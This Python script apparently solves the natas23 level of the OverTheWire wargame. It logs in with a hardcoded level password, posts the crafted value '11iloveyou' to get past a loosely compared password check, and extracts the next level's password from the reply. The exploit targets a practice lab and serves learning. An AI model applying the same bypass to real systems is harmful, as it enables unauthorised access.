import requests
import re

username = "natas23"
passsowrd = "qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"

url = "http://%s.natas.labs.overthewire.org/"%username

sesssion = requests.Session()
response = sesssion.post(url ,data={"passwd" : "11iloveyou"} ,auth=(username,passsowrd)  )
content = response.text

flag = re.findall("Username: natas24 Password: (.*)</pre>",content)[0]

print("[+] Gotcha ",flag)